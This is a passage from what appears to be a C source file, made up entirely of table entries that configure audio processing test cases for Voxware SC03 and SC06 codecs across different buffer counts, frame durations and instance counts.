    { MediaProcess, "Process, Encoder, 50 Buffers, 20ms, Voxware SC03, 4",             0, 0, 4, 0,  0,  FALSE, WAVE_FORMAT_VOXWARE_SC03, 50,  20  },
    { MediaProcess, "Process, Decoder, 50 Buffers, 20ms, Voxware SC03, 4",             0, 0, 0, 4,  0,  FALSE, WAVE_FORMAT_VOXWARE_SC03, 50,  20  },
    { MediaProcess, "Process, Decoder Mix, 50 Buffers, 20ms, Voxware SC03, 4",         0, 0, 0, 4,  0,  TRUE,  WAVE_FORMAT_VOXWARE_SC03, 50,  20  },
    { MediaProcess, "Process, Queue, 50 Buffers, 20ms, Voxware SC03, 4",               0, 0, 0, 0,  4,  FALSE, WAVE_FORMAT_VOXWARE_SC03, 50,  20  },
    { MediaProcess, "Process, Queue Mix, 50 Buffers, 20ms, Voxware SC03, 4",           0, 0, 0, 0,  4,  TRUE,  WAVE_FORMAT_VOXWARE_SC03, 50,  20  },
    { MediaProcess, "Process, All (Decoder), 50 Buffers, 20ms, Voxware SC03, 4",       4, 4, 4, 4,  0,  FALSE, WAVE_FORMAT_VOXWARE_SC03, 50,  20  },
    { MediaProcess, "Process, All (Decoder Mix), 50 Buffers, 20ms, Voxware SC03, 4",   4, 4, 4, 4,  0,  TRUE,  WAVE_FORMAT_VOXWARE_SC03, 50,  20  },
    { MediaProcess, "Process, All (Queue), 50 Buffers, 20ms, Voxware SC03, 4",         4, 4, 4, 0,  4,  FALSE, WAVE_FORMAT_VOXWARE_SC03, 50,  20  },
    { MediaProcess, "Process, All (Queue Mix), 50 Buffers, 20ms, Voxware SC03, 4",     4, 4, 4, 0,  4,  TRUE,  WAVE_FORMAT_VOXWARE_SC03, 50,  20  },
    { MediaProcess, "Process, Decoder, 50 Buffers, 20ms, Voxware SC03, 12",            0, 0, 0, 12, 0,  FALSE, WAVE_FORMAT_VOXWARE_SC03, 50,  20  },
    { MediaProcess, "Process, Decoder Mix, 50 Buffers, 20ms, Voxware SC03, 12",        0, 0, 0, 12, 0,  TRUE,  WAVE_FORMAT_VOXWARE_SC03, 50,  20  },
    { MediaProcess, "Process, Queue, 50 Buffers, 20ms, Voxware SC03, 12",              0, 0, 0, 0,  12, FALSE, WAVE_FORMAT_VOXWARE_SC03, 50,  20  },
    { MediaProcess, "Process, Queue Mix, 50 Buffers, 20ms, Voxware SC03, 12",          0, 0, 0, 0,  12, TRUE,  WAVE_FORMAT_VOXWARE_SC03, 50,  20  },
    { MediaProcess, "Process, All (Decoder), 50 Buffers, 20ms, Voxware SC03, 12",      4, 4, 4, 12, 0,  FALSE, WAVE_FORMAT_VOXWARE_SC03, 50,  20  },
    { MediaProcess, "Process, All (Decoder Mix), 50 Buffers, 20ms, Voxware SC03, 12",  4, 4, 4, 12, 0,  TRUE,  WAVE_FORMAT_VOXWARE_SC03, 50,  20  },
    { MediaProcess, "Process, All (Queue), 50 Buffers, 20ms, Voxware SC03, 12",        4, 4, 4, 0,  12, FALSE, WAVE_FORMAT_VOXWARE_SC03, 50,  20  },
    { MediaProcess, "Process, All (Queue Mix), 50 Buffers, 20ms, Voxware SC03, 12",    4, 4, 4, 0,  12, TRUE,  WAVE_FORMAT_VOXWARE_SC03, 50,  20  },
    { MediaProcess, "Process, Microphone, 5 Buffers, 40ms, Voxware SC03, 1",           1, 0, 0, 0,  0,  FALSE, WAVE_FORMAT_VOXWARE_SC03, 5,   40  },
    { MediaProcess, "Process, Headphone, 5 Buffers, 40ms, Voxware SC03, 1",            0, 1, 0, 0,  0,  FALSE, WAVE_FORMAT_VOXWARE_SC03, 5,   40  },
    { MediaProcess, "Process, Encoder, 5 Buffers, 40ms, Voxware SC03, 1",              0, 0, 1, 0,  0,  FALSE, WAVE_FORMAT_VOXWARE_SC03, 5,   40  },
    { MediaProcess, "Process, Decoder, 5 Buffers, 40ms, Voxware SC03, 1",              0, 0, 0, 1,  0,  FALSE, WAVE_FORMAT_VOXWARE_SC03, 5,   40  },
    { MediaProcess, "Process, Queue, 5 Buffers, 40ms, Voxware SC03, 1",                0, 0, 0, 0,  1,  FALSE, WAVE_FORMAT_VOXWARE_SC03, 5,   40  },
    { MediaProcess, "Process, All (Decoder), 5 Buffers, 40ms, Voxware SC03, 1",        1, 1, 1, 1,  0,  FALSE, WAVE_FORMAT_VOXWARE_SC03, 5,   40  },
    { MediaProcess, "Process, All (Queue), 5 Buffers, 40ms, Voxware SC03, 1",          1, 1, 1, 0,  1,  FALSE, WAVE_FORMAT_VOXWARE_SC03, 5,   40  },
    { MediaProcess, "Process, Microphone, 5 Buffers, 40ms, Voxware SC03, 4",           4, 0, 0, 0,  0,  FALSE, WAVE_FORMAT_VOXWARE_SC03, 5,   40  },
    { MediaProcess, "Process, Headphone, 5 Buffers, 40ms, Voxware SC03, 4",            0, 4, 0, 0,  0,  FALSE, WAVE_FORMAT_VOXWARE_SC03, 5,   40  },
    { MediaProcess, "Process, Encoder, 5 Buffers, 40ms, Voxware SC03, 4",              0, 0, 4, 0,  0,  FALSE, WAVE_FORMAT_VOXWARE_SC03, 5,   40  },
    { MediaProcess, "Process, Decoder, 5 Buffers, 40ms, Voxware SC03, 4",              0, 0, 0, 4,  0,  FALSE, WAVE_FORMAT_VOXWARE_SC03, 5,   40  },
    { MediaProcess, "Process, Decoder Mix, 5 Buffers, 40ms, Voxware SC03, 4",          0, 0, 0, 4,  0,  TRUE,  WAVE_FORMAT_VOXWARE_SC03, 5,   40  },
    { MediaProcess, "Process, Queue, 5 Buffers, 40ms, Voxware SC03, 4",                0, 0, 0, 0,  4,  FALSE, WAVE_FORMAT_VOXWARE_SC03, 5,   40  },
    { MediaProcess, "Process, Queue Mix, 5 Buffers, 40ms, Voxware SC03, 4",            0, 0, 0, 0,  4,  TRUE,  WAVE_FORMAT_VOXWARE_SC03, 5,   40  },
    { MediaProcess, "Process, All (Decoder), 5 Buffers, 40ms, Voxware SC03, 4",        4, 4, 4, 4,  0,  FALSE, WAVE_FORMAT_VOXWARE_SC03, 5,   40  },
    { MediaProcess, "Process, All (Decoder Mix), 5 Buffers, 40ms, Voxware SC03, 4",    4, 4, 4, 4,  0,  TRUE,  WAVE_FORMAT_VOXWARE_SC03, 5,   40  },
    { MediaProcess, "Process, All (Queue), 5 Buffers, 40ms, Voxware SC03, 4",          4, 4, 4, 0,  4,  FALSE, WAVE_FORMAT_VOXWARE_SC03, 5,   40  },
    { MediaProcess, "Process, All (Queue Mix), 5 Buffers, 40ms, Voxware SC03, 4",      4, 4, 4, 0,  4,  TRUE,  WAVE_FORMAT_VOXWARE_SC03, 5,   40  },
    { MediaProcess, "Process, Decoder, 5 Buffers, 40ms, Voxware SC03, 12",             0, 0, 0, 12, 0,  FALSE, WAVE_FORMAT_VOXWARE_SC03, 5,   40  },
    { MediaProcess, "Process, Decoder Mix, 5 Buffers, 40ms, Voxware SC03, 12",         0, 0, 0, 12, 0,  TRUE,  WAVE_FORMAT_VOXWARE_SC03, 5,   40  },
    { MediaProcess, "Process, Queue, 5 Buffers, 40ms, Voxware SC03, 12",               0, 0, 0, 0,  12, FALSE, WAVE_FORMAT_VOXWARE_SC03, 5,   40  },
    { MediaProcess, "Process, Queue Mix, 5 Buffers, 40ms, Voxware SC03, 12",           0, 0, 0, 0,  12, TRUE,  WAVE_FORMAT_VOXWARE_SC03, 5,   40  },
    { MediaProcess, "Process, All (Decoder), 5 Buffers, 40ms, Voxware SC03, 12",       4, 4, 4, 12, 0,  FALSE, WAVE_FORMAT_VOXWARE_SC03, 5,   40  },
    { MediaProcess, "Process, All (Decoder Mix), 5 Buffers, 40ms, Voxware SC03, 12",   4, 4, 4, 12, 0,  TRUE,  WAVE_FORMAT_VOXWARE_SC03, 5,   40  },
    { MediaProcess, "Process, All (Queue), 5 Buffers, 40ms, Voxware SC03, 12",         4, 4, 4, 0,  12, FALSE, WAVE_FORMAT_VOXWARE_SC03, 5,   40  },
    { MediaProcess, "Process, All (Queue Mix), 5 Buffers, 40ms, Voxware SC03, 12",     4, 4, 4, 0,  12, TRUE,  WAVE_FORMAT_VOXWARE_SC03, 5,   40  },
    { MediaProcess, "Process, Microphone, 25 Buffers, 40ms, Voxware SC03, 1",          1, 0, 0, 0,  0,  FALSE, WAVE_FORMAT_VOXWARE_SC03, 25,  40  },
    { MediaProcess, "Process, Headphone, 25 Buffers, 40ms, Voxware SC03, 1",           0, 1, 0, 0,  0,  FALSE, WAVE_FORMAT_VOXWARE_SC03, 25,  40  },
    { MediaProcess, "Process, Encoder, 25 Buffers, 40ms, Voxware SC03, 1",             0, 0, 1, 0,  0,  FALSE, WAVE_FORMAT_VOXWARE_SC03, 25,  40  },
    { MediaProcess, "Process, Decoder, 25 Buffers, 40ms, Voxware SC03, 1",             0, 0, 0, 1,  0,  FALSE, WAVE_FORMAT_VOXWARE_SC03, 25,  40  },
    { MediaProcess, "Process, Queue, 25 Buffers, 40ms, Voxware SC03, 1",               0, 0, 0, 0,  1,  FALSE, WAVE_FORMAT_VOXWARE_SC03, 25,  40  },
    { MediaProcess, "Process, All (Decoder), 25 Buffers, 40ms, Voxware SC03, 1",       1, 1, 1, 1,  0,  FALSE, WAVE_FORMAT_VOXWARE_SC03, 25,  40  },
    { MediaProcess, "Process, All (Queue), 25 Buffers, 40ms, Voxware SC03, 1",         1, 1, 1, 0,  1,  FALSE, WAVE_FORMAT_VOXWARE_SC03, 25,  40  },
    { MediaProcess, "Process, Microphone, 25 Buffers, 40ms, Voxware SC03, 4",          4, 0, 0, 0,  0,  FALSE, WAVE_FORMAT_VOXWARE_SC03, 25,  40  },
    { MediaProcess, "Process, Headphone, 25 Buffers, 40ms, Voxware SC03, 4",           0, 4, 0, 0,  0,  FALSE, WAVE_FORMAT_VOXWARE_SC03, 25,  40  },
    { MediaProcess, "Process, Encoder, 25 Buffers, 40ms, Voxware SC03, 4",             0, 0, 4, 0,  0,  FALSE, WAVE_FORMAT_VOXWARE_SC03, 25,  40  },
    { MediaProcess, "Process, Decoder, 25 Buffers, 40ms, Voxware SC03, 4",             0, 0, 0, 4,  0,  FALSE, WAVE_FORMAT_VOXWARE_SC03, 25,  40  },
    { MediaProcess, "Process, Decoder Mix, 25 Buffers, 40ms, Voxware SC03, 4",         0, 0, 0, 4,  0,  TRUE,  WAVE_FORMAT_VOXWARE_SC03, 25,  40  },
    { MediaProcess, "Process, Queue, 25 Buffers, 40ms, Voxware SC03, 4",               0, 0, 0, 0,  4,  FALSE, WAVE_FORMAT_VOXWARE_SC03, 25,  40  },
    { MediaProcess, "Process, Queue Mix, 25 Buffers, 40ms, Voxware SC03, 4",           0, 0, 0, 0,  4,  TRUE,  WAVE_FORMAT_VOXWARE_SC03, 25,  40  },
    { MediaProcess, "Process, All (Decoder), 25 Buffers, 40ms, Voxware SC03, 4",       4, 4, 4, 4,  0,  FALSE, WAVE_FORMAT_VOXWARE_SC03, 25,  40  },
    { MediaProcess, "Process, All (Decoder Mix), 25 Buffers, 40ms, Voxware SC03, 4",   4, 4, 4, 4,  0,  TRUE,  WAVE_FORMAT_VOXWARE_SC03, 25,  40  },
    { MediaProcess, "Process, All (Queue), 25 Buffers, 40ms, Voxware SC03, 4",         4, 4, 4, 0,  4,  FALSE, WAVE_FORMAT_VOXWARE_SC03, 25,  40  },
    { MediaProcess, "Process, All (Queue Mix), 25 Buffers, 40ms, Voxware SC03, 4",     4, 4, 4, 0,  4,  TRUE,  WAVE_FORMAT_VOXWARE_SC03, 25,  40  },
    { MediaProcess, "Process, Decoder, 25 Buffers, 40ms, Voxware SC03, 12",            0, 0, 0, 12, 0,  FALSE, WAVE_FORMAT_VOXWARE_SC03, 25,  40  },
    { MediaProcess, "Process, Decoder Mix, 25 Buffers, 40ms, Voxware SC03, 12",        0, 0, 0, 12, 0,  TRUE,  WAVE_FORMAT_VOXWARE_SC03, 25,  40  },
    { MediaProcess, "Process, Queue, 25 Buffers, 40ms, Voxware SC03, 12",              0, 0, 0, 0,  12, FALSE, WAVE_FORMAT_VOXWARE_SC03, 25,  40  },
    { MediaProcess, "Process, Queue Mix, 25 Buffers, 40ms, Voxware SC03, 12",          0, 0, 0, 0,  12, TRUE,  WAVE_FORMAT_VOXWARE_SC03, 25,  40  },
    { MediaProcess, "Process, All (Decoder), 25 Buffers, 40ms, Voxware SC03, 12",      4, 4, 4, 12, 0,  FALSE, WAVE_FORMAT_VOXWARE_SC03, 25,  40  },
    { MediaProcess, "Process, All (Decoder Mix), 25 Buffers, 40ms, Voxware SC03, 12",  4, 4, 4, 12, 0,  TRUE,  WAVE_FORMAT_VOXWARE_SC03, 25,  40  },
    { MediaProcess, "Process, All (Queue), 25 Buffers, 40ms, Voxware SC03, 12",        4, 4, 4, 0,  12, FALSE, WAVE_FORMAT_VOXWARE_SC03, 25,  40  },
    { MediaProcess, "Process, All (Queue Mix), 25 Buffers, 40ms, Voxware SC03, 12",    4, 4, 4, 0,  12, TRUE,  WAVE_FORMAT_VOXWARE_SC03, 25,  40  },
    { MediaProcess, "Process, Microphone, 2 Buffers, 100ms, Voxware SC03, 1",          1, 0, 0, 0,  0,  FALSE, WAVE_FORMAT_VOXWARE_SC03, 2,   100 },
    { MediaProcess, "Process, Headphone, 2 Buffers, 100ms, Voxware SC03, 1",           0, 1, 0, 0,  0,  FALSE, WAVE_FORMAT_VOXWARE_SC03, 2,   100 },
    { MediaProcess, "Process, Encoder, 2 Buffers, 100ms, Voxware SC03, 1",             0, 0, 1, 0,  0,  FALSE, WAVE_FORMAT_VOXWARE_SC03, 2,   100 },
    { MediaProcess, "Process, Decoder, 2 Buffers, 100ms, Voxware SC03, 1",             0, 0, 0, 1,  0,  FALSE, WAVE_FORMAT_VOXWARE_SC03, 2,   100 },
    { MediaProcess, "Process, Queue, 2 Buffers, 100ms, Voxware SC03, 1",               0, 0, 0, 0,  1,  FALSE, WAVE_FORMAT_VOXWARE_SC03, 2,   100 },
    { MediaProcess, "Process, All (Decoder), 2 Buffers, 100ms, Voxware SC03, 1",       1, 1, 1, 1,  0,  FALSE, WAVE_FORMAT_VOXWARE_SC03, 2,   100 },
    { MediaProcess, "Process, All (Queue), 2 Buffers, 100ms, Voxware SC03, 1",         1, 1, 1, 0,  1,  FALSE, WAVE_FORMAT_VOXWARE_SC03, 2,   100 },
    { MediaProcess, "Process, Microphone, 2 Buffers, 100ms, Voxware SC03, 4",          4, 0, 0, 0,  0,  FALSE, WAVE_FORMAT_VOXWARE_SC03, 2,   100 },
    { MediaProcess, "Process, Headphone, 2 Buffers, 100ms, Voxware SC03, 4",           0, 4, 0, 0,  0,  FALSE, WAVE_FORMAT_VOXWARE_SC03, 2,   100 },
    { MediaProcess, "Process, Encoder, 2 Buffers, 100ms, Voxware SC03, 4",             0, 0, 4, 0,  0,  FALSE, WAVE_FORMAT_VOXWARE_SC03, 2,   100 },
    { MediaProcess, "Process, Decoder, 2 Buffers, 100ms, Voxware SC03, 4",             0, 0, 0, 4,  0,  FALSE, WAVE_FORMAT_VOXWARE_SC03, 2,   100 },
    { MediaProcess, "Process, Decoder Mix, 2 Buffers, 100ms, Voxware SC03, 4",         0, 0, 0, 4,  0,  TRUE,  WAVE_FORMAT_VOXWARE_SC03, 2,   100 },
    { MediaProcess, "Process, Queue, 2 Buffers, 100ms, Voxware SC03, 4",               0, 0, 0, 0,  4,  FALSE, WAVE_FORMAT_VOXWARE_SC03, 2,   100 },
    { MediaProcess, "Process, Queue Mix, 2 Buffers, 100ms, Voxware SC03, 4",           0, 0, 0, 0,  4,  TRUE,  WAVE_FORMAT_VOXWARE_SC03, 2,   100 },
    { MediaProcess, "Process, All (Decoder), 2 Buffers, 100ms, Voxware SC03, 4",       4, 4, 4, 4,  0,  FALSE, WAVE_FORMAT_VOXWARE_SC03, 2,   100 },
    { MediaProcess, "Process, All (Decoder Mix), 2 Buffers, 100ms, Voxware SC03, 4",   4, 4, 4, 4,  0,  TRUE,  WAVE_FORMAT_VOXWARE_SC03, 2,   100 },
    { MediaProcess, "Process, All (Queue), 2 Buffers, 100ms, Voxware SC03, 4",         4, 4, 4, 0,  4,  FALSE, WAVE_FORMAT_VOXWARE_SC03, 2,   100 },
    { MediaProcess, "Process, All (Queue Mix), 2 Buffers, 100ms, Voxware SC03, 4",     4, 4, 4, 0,  4,  TRUE,  WAVE_FORMAT_VOXWARE_SC03, 2,   100 },
    { MediaProcess, "Process, Decoder, 2 Buffers, 100ms, Voxware SC03, 12",            0, 0, 0, 12, 0,  FALSE, WAVE_FORMAT_VOXWARE_SC03, 2,   100 },
    { MediaProcess, "Process, Decoder Mix, 2 Buffers, 100ms, Voxware SC03, 12",        0, 0, 0, 12, 0,  TRUE,  WAVE_FORMAT_VOXWARE_SC03, 2,   100 },
    { MediaProcess, "Process, Queue, 2 Buffers, 100ms, Voxware SC03, 12",              0, 0, 0, 0,  12, FALSE, WAVE_FORMAT_VOXWARE_SC03, 2,   100 },
    { MediaProcess, "Process, Queue Mix, 2 Buffers, 100ms, Voxware SC03, 12",          0, 0, 0, 0,  12, TRUE,  WAVE_FORMAT_VOXWARE_SC03, 2,   100 },
    { MediaProcess, "Process, All (Decoder), 2 Buffers, 100ms, Voxware SC03, 12",      4, 4, 4, 12, 0,  FALSE, WAVE_FORMAT_VOXWARE_SC03, 2,   100 },
    { MediaProcess, "Process, All (Decoder Mix), 2 Buffers, 100ms, Voxware SC03, 12",  4, 4, 4, 12, 0,  TRUE,  WAVE_FORMAT_VOXWARE_SC03, 2,   100 },
    { MediaProcess, "Process, All (Queue), 2 Buffers, 100ms, Voxware SC03, 12",        4, 4, 4, 0,  12, FALSE, WAVE_FORMAT_VOXWARE_SC03, 2,   100 },
    { MediaProcess, "Process, All (Queue Mix), 2 Buffers, 100ms, Voxware SC03, 12",    4, 4, 4, 0,  12, TRUE,  WAVE_FORMAT_VOXWARE_SC03, 2,   100 },
    { MediaProcess, "Process, Microphone, 10 Buffers, 100ms, Voxware SC03, 1",         1, 0, 0, 0,  0,  FALSE, WAVE_FORMAT_VOXWARE_SC03, 10,  100 },
    { MediaProcess, "Process, Headphone, 10 Buffers, 100ms, Voxware SC03, 1",          0, 1, 0, 0,  0,  FALSE, WAVE_FORMAT_VOXWARE_SC03, 10,  100 },
    { MediaProcess, "Process, Encoder, 10 Buffers, 100ms, Voxware SC03, 1",            0, 0, 1, 0,  0,  FALSE, WAVE_FORMAT_VOXWARE_SC03, 10,  100 },
    { MediaProcess, "Process, Decoder, 10 Buffers, 100ms, Voxware SC03, 1",            0, 0, 0, 1,  0,  FALSE, WAVE_FORMAT_VOXWARE_SC03, 10,  100 },
    { MediaProcess, "Process, Queue, 10 Buffers, 100ms, Voxware SC03, 1",              0, 0, 0, 0,  1,  FALSE, WAVE_FORMAT_VOXWARE_SC03, 10,  100 },
    { MediaProcess, "Process, All (Decoder), 10 Buffers, 100ms, Voxware SC03, 1",      1, 1, 1, 1,  0,  FALSE, WAVE_FORMAT_VOXWARE_SC03, 10,  100 },
    { MediaProcess, "Process, All (Queue), 10 Buffers, 100ms, Voxware SC03, 1",        1, 1, 1, 0,  1,  FALSE, WAVE_FORMAT_VOXWARE_SC03, 10,  100 },
    { MediaProcess, "Process, Microphone, 10 Buffers, 100ms, Voxware SC03, 4",         4, 0, 0, 0,  0,  FALSE, WAVE_FORMAT_VOXWARE_SC03, 10,  100 },
    { MediaProcess, "Process, Headphone, 10 Buffers, 100ms, Voxware SC03, 4",          0, 4, 0, 0,  0,  FALSE, WAVE_FORMAT_VOXWARE_SC03, 10,  100 },
    { MediaProcess, "Process, Encoder, 10 Buffers, 100ms, Voxware SC03, 4",            0, 0, 4, 0,  0,  FALSE, WAVE_FORMAT_VOXWARE_SC03, 10,  100 },
    { MediaProcess, "Process, Decoder, 10 Buffers, 100ms, Voxware SC03, 4",            0, 0, 0, 4,  0,  FALSE, WAVE_FORMAT_VOXWARE_SC03, 10,  100 },
    { MediaProcess, "Process, Decoder Mix, 10 Buffers, 100ms, Voxware SC03, 4",        0, 0, 0, 4,  0,  TRUE,  WAVE_FORMAT_VOXWARE_SC03, 10,  100 },
    { MediaProcess, "Process, Queue, 10 Buffers, 100ms, Voxware SC03, 4",              0, 0, 0, 0,  4,  FALSE, WAVE_FORMAT_VOXWARE_SC03, 10,  100 },
    { MediaProcess, "Process, Queue Mix, 10 Buffers, 100ms, Voxware SC03, 4",          0, 0, 0, 0,  4,  TRUE,  WAVE_FORMAT_VOXWARE_SC03, 10,  100 },
    { MediaProcess, "Process, All (Decoder), 10 Buffers, 100ms, Voxware SC03, 4",      4, 4, 4, 4,  0,  FALSE, WAVE_FORMAT_VOXWARE_SC03, 10,  100 },
    { MediaProcess, "Process, All (Decoder Mix), 10 Buffers, 100ms, Voxware SC03, 4",  4, 4, 4, 4,  0,  TRUE,  WAVE_FORMAT_VOXWARE_SC03, 10,  100 },
    { MediaProcess, "Process, All (Queue), 10 Buffers, 100ms, Voxware SC03, 4",        4, 4, 4, 0,  4,  FALSE, WAVE_FORMAT_VOXWARE_SC03, 10,  100 },
    { MediaProcess, "Process, All (Queue Mix), 10 Buffers, 100ms, Voxware SC03, 4",    4, 4, 4, 0,  4,  TRUE,  WAVE_FORMAT_VOXWARE_SC03, 10,  100 },
    { MediaProcess, "Process, Decoder, 10 Buffers, 100ms, Voxware SC03, 12",           0, 0, 0, 12, 0,  FALSE, WAVE_FORMAT_VOXWARE_SC03, 10,  100 },
    { MediaProcess, "Process, Decoder Mix, 10 Buffers, 100ms, Voxware SC03, 12",       0, 0, 0, 12, 0,  TRUE,  WAVE_FORMAT_VOXWARE_SC03, 10,  100 },
    { MediaProcess, "Process, Queue, 10 Buffers, 100ms, Voxware SC03, 12",             0, 0, 0, 0,  12, FALSE, WAVE_FORMAT_VOXWARE_SC03, 10,  100 },
    { MediaProcess, "Process, Queue Mix, 10 Buffers, 100ms, Voxware SC03, 12",         0, 0, 0, 0,  12, TRUE,  WAVE_FORMAT_VOXWARE_SC03, 10,  100 },
    { MediaProcess, "Process, All (Decoder), 10 Buffers, 100ms, Voxware SC03, 12",     4, 4, 4, 12, 0,  FALSE, WAVE_FORMAT_VOXWARE_SC03, 10,  100 },
    { MediaProcess, "Process, All (Decoder Mix), 10 Buffers, 100ms, Voxware SC03, 12", 4, 4, 4, 12, 0,  TRUE,  WAVE_FORMAT_VOXWARE_SC03, 10,  100 },
    { MediaProcess, "Process, All (Queue), 10 Buffers, 100ms, Voxware SC03, 12",       4, 4, 4, 0,  12, FALSE, WAVE_FORMAT_VOXWARE_SC03, 10,  100 },
    { MediaProcess, "Process, All (Queue Mix), 10 Buffers, 100ms, Voxware SC03, 12",   4, 4, 4, 0,  12, TRUE,  WAVE_FORMAT_VOXWARE_SC03, 10,  100 },
    { MediaProcess, "Process, Microphone, 10 Buffers, 20ms, Voxware SC06, 1",          1, 0, 0, 0,  0,  FALSE, WAVE_FORMAT_VOXWARE_SC06, 10,  20  },
    { MediaProcess, "Process, Headphone, 10 Buffers, 20ms, Voxware SC06, 1",           0, 1, 0, 0,  0,  FALSE, WAVE_FORMAT_VOXWARE_SC06, 10,  20  },
    { MediaProcess, "Process, Encoder, 10 Buffers, 20ms, Voxware SC06, 1",             0, 0, 1, 0,  0,  FALSE, WAVE_FORMAT_VOXWARE_SC06, 10,  20  },
    { MediaProcess, "Process, Decoder, 10 Buffers, 20ms, Voxware SC06, 1",             0, 0, 0, 1,  0,  FALSE, WAVE_FORMAT_VOXWARE_SC06, 10,  20  },
    { MediaProcess, "Process, Queue, 10 Buffers, 20ms, Voxware SC06, 1",               0, 0, 0, 0,  1,  FALSE, WAVE_FORMAT_VOXWARE_SC06, 10,  20  },
    { MediaProcess, "Process, All (Decoder), 10 Buffers, 20ms, Voxware SC06, 1",       1, 1, 1, 1,  0,  FALSE, WAVE_FORMAT_VOXWARE_SC06, 10,  20  },
    { MediaProcess, "Process, All (Queue), 10 Buffers, 20ms, Voxware SC06, 1",         1, 1, 1, 0,  1,  FALSE, WAVE_FORMAT_VOXWARE_SC06, 10,  20  },
    { MediaProcess, "Process, Microphone, 10 Buffers, 20ms, Voxware SC06, 4",          4, 0, 0, 0,  0,  FALSE, WAVE_FORMAT_VOXWARE_SC06, 10,  20  },
    { MediaProcess, "Process, Headphone, 10 Buffers, 20ms, Voxware SC06, 4",           0, 4, 0, 0,  0,  FALSE, WAVE_FORMAT_VOXWARE_SC06, 10,  20  },
    { MediaProcess, "Process, Encoder, 10 Buffers, 20ms, Voxware SC06, 4",             0, 0, 4, 0,  0,  FALSE, WAVE_FORMAT_VOXWARE_SC06, 10,  20  },
    { MediaProcess, "Process, Decoder, 10 Buffers, 20ms, Voxware SC06, 4",             0, 0, 0, 4,  0,  FALSE, WAVE_FORMAT_VOXWARE_SC06, 10,  20  },
    { MediaProcess, "Process, Decoder Mix, 10 Buffers, 20ms, Voxware SC06, 4",         0, 0, 0, 4,  0,  TRUE,  WAVE_FORMAT_VOXWARE_SC06, 10,  20  },
    { MediaProcess, "Process, Queue, 10 Buffers, 20ms, Voxware SC06, 4",               0, 0, 0, 0,  4,  FALSE, WAVE_FORMAT_VOXWARE_SC06, 10,  20  },
    { MediaProcess, "Process, Queue Mix, 10 Buffers, 20ms, Voxware SC06, 4",           0, 0, 0, 0,  4,  TRUE,  WAVE_FORMAT_VOXWARE_SC06, 10,  20  },
    { MediaProcess, "Process, All (Decoder), 10 Buffers, 20ms, Voxware SC06, 4",       4, 4, 4, 4,  0,  FALSE, WAVE_FORMAT_VOXWARE_SC06, 10,  20  },
    { MediaProcess, "Process, All (Decoder Mix), 10 Buffers, 20ms, Voxware SC06, 4",   4, 4, 4, 4,  0,  TRUE,  WAVE_FORMAT_VOXWARE_SC06, 10,  20  },
    { MediaProcess, "Process, All (Queue), 10 Buffers, 20ms, Voxware SC06, 4",         4, 4, 4, 0,  4,  FALSE, WAVE_FORMAT_VOXWARE_SC06, 10,  20  },
    { MediaProcess, "Process, All (Queue Mix), 10 Buffers, 20ms, Voxware SC06, 4",     4, 4, 4, 0,  4,  TRUE,  WAVE_FORMAT_VOXWARE_SC06, 10,  20  },
    { MediaProcess, "Process, Decoder, 10 Buffers, 20ms, Voxware SC06, 12",            0, 0, 0, 12, 0,  FALSE, WAVE_FORMAT_VOXWARE_SC06, 10,  20  },
    { MediaProcess, "Process, Decoder Mix, 10 Buffers, 20ms, Voxware SC06, 12",        0, 0, 0, 12, 0,  TRUE,  WAVE_FORMAT_VOXWARE_SC06, 10,  20  },
    { MediaProcess, "Process, Queue, 10 Buffers, 20ms, Voxware SC06, 12",              0, 0, 0, 0,  12, FALSE, WAVE_FORMAT_VOXWARE_SC06, 10,  20  },
    { MediaProcess, "Process, Queue Mix, 10 Buffers, 20ms, Voxware SC06, 12",          0, 0, 0, 0,  12, TRUE,  WAVE_FORMAT_VOXWARE_SC06, 10,  20  },
    { MediaProcess, "Process, All (Decoder), 10 Buffers, 20ms, Voxware SC06, 12",      4, 4, 4, 12, 0,  FALSE, WAVE_FORMAT_VOXWARE_SC06, 10,  20  },
    { MediaProcess, "Process, All (Decoder Mix), 10 Buffers, 20ms, Voxware SC06, 12",  4, 4, 4, 12, 0,  TRUE,  WAVE_FORMAT_VOXWARE_SC06, 10,  20  },
    { MediaProcess, "Process, All (Queue), 10 Buffers, 20ms, Voxware SC06, 12",        4, 4, 4, 0,  12, FALSE, WAVE_FORMAT_VOXWARE_SC06, 10,  20  },
    { MediaProcess, "Process, All (Queue Mix), 10 Buffers, 20ms, Voxware SC06, 12",    4, 4, 4, 0,  12, TRUE,  WAVE_FORMAT_VOXWARE_SC06, 10,  20  },
    { MediaProcess, "Process, Microphone, 50 Buffers, 20ms, Voxware SC06, 1",          1, 0, 0, 0,  0,  FALSE, WAVE_FORMAT_VOXWARE_SC06, 50,  20  },
    { MediaProcess, "Process, Headphone, 50 Buffers, 20ms, Voxware SC06, 1",           0, 1, 0, 0,  0,  FALSE, WAVE_FORMAT_VOXWARE_SC06, 50,  20  },
    { MediaProcess, "Process, Encoder, 50 Buffers, 20ms, Voxware SC06, 1",             0, 0, 1, 0,  0,  FALSE, WAVE_FORMAT_VOXWARE_SC06, 50,  20  },
    { MediaProcess, "Process, Decoder, 50 Buffers, 20ms, Voxware SC06, 1",             0, 0, 0, 1,  0,  FALSE, WAVE_FORMAT_VOXWARE_SC06, 50,  20  },
    { MediaProcess, "Process, Queue, 50 Buffers, 20ms, Voxware SC06, 1",               0, 0, 0, 0,  1,  FALSE, WAVE_FORMAT_VOXWARE_SC06, 50,  20  },
    { MediaProcess, "Process, All (Decoder), 50 Buffers, 20ms, Voxware SC06, 1",       1, 1, 1, 1,  0,  FALSE, WAVE_FORMAT_VOXWARE_SC06, 50,  20  },
    { MediaProcess, "Process, All (Queue), 50 Buffers, 20ms, Voxware SC06, 1",         1, 1, 1, 0,  1,  FALSE, WAVE_FORMAT_VOXWARE_SC06, 50,  20  },
    { MediaProcess, "Process, Microphone, 50 Buffers, 20ms, Voxware SC06, 4",          4, 0, 0, 0,  0,  FALSE, WAVE_FORMAT_VOXWARE_SC06, 50,  20  },
    { MediaProcess, "Process, Headphone, 50 Buffers, 20ms, Voxware SC06, 4",           0, 4, 0, 0,  0,  FALSE, WAVE_FORMAT_VOXWARE_SC06, 50,  20  },
    { MediaProcess, "Process, Encoder, 50 Buffers, 20ms, Voxware SC06, 4",             0, 0, 4, 0,  0,  FALSE, WAVE_FORMAT_VOXWARE_SC06, 50,  20  },
    { MediaProcess, "Process, Decoder, 50 Buffers, 20ms, Voxware SC06, 4",             0, 0, 0, 4,  0,  FALSE, WAVE_FORMAT_VOXWARE_SC06, 50,  20  },
